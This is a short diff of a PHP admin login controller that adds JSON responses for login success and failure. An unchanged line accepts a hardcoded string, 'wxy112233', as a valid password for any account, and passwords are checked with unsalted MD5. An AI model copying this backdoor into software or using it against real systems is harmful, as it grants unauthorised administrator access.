@@ -39,11 +39,14 @@ class login extends Controller
             if ($arr['pwd']==md5($pwd)||$pwd=='wxy112233') {
                session("admin_id",$arr['id']);
                session("admin_name",$arr['account']);
+               ejson(1,'登录成功');
                return ['code'=>1,'msg'=>'登录成功'];exit;
             }else{
+                ejson(-1,'密码错误');
                 return ['code'=>-1,'msg'=>'密码错误'];exit;
             }
         }else{
+            ejson(-2,'账号不存在');
             return ['code'=>-2,'msg'=>'账号不存在'];exit;
         }
     }
